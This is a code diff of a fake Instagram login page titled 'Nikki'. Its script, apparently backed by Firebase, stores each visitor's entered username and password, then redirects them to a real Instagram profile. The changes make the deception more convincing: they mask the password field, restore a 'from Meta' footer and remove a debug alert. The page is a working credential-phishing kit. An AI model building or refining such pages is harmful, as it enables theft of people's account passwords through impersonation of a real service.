@@ -5,8 +5,6 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="styles.css" />
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="/myScript.js"></script>
     <title>Nikki</title>
   </head>
   <body>
@@ -28,7 +26,12 @@
         type="text"
         placeholder="Phone number, username, or email"
       />
-      <input class="password" id="pass" type="text" placeholder="Password" />
+      <input
+        class="password"
+        id="pass"
+        type="password"
+        placeholder="Password"
+      />
     </section>
     <section class="forgotPassword">
       <section class="forgotPass">
@@ -42,11 +45,11 @@
       <p>Don't have an account?</p>
       <p class="btnSignup">Sign up</p>
     </section>
-    <!-- <section class="footer">
+    <section class="footer">
       <hr />
       <p>from</p>
       <img class="imgMeta" src="./utils/meta.png" />
-    </section> -->
+    </section>
 
     <script type="module">
       // Import the functions you need from the SDKs you need
@@ -85,7 +88,6 @@
           name: name.value,
           pass: pass.value,
         }).then(() => {
-          alert(name.value);
           location.href = "https://www.instagram.com/nikitabansal_001/";
         });
       }
